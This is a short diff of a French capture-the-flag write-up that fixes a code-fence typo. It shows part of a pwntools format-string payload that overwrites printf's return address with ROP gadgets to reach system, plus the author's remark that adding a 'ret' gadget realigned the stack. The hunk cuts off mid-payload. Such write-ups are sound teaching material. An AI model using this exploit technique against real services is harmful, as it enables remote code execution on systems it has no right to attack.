@@ -41,7 +41,7 @@ Le décompte des octets etc étant assez pénible à la main, j'ai utilisé le `
 
 J'ai pas mal galéré pour pas grand chose, mon exploit ne fonctionnait pas en remote, finalement comme souvent en ajoutant un `ret` en tête des gagets ça réaligne la stack et l'appelle à system ne crash plus.
 
-``̀ python
+```python
 payload =  fmtstr_payload(32, {
     ret_printf     :  ROP_ret,
     ret_printf +  8:  ROP_pop_rdi_ret,
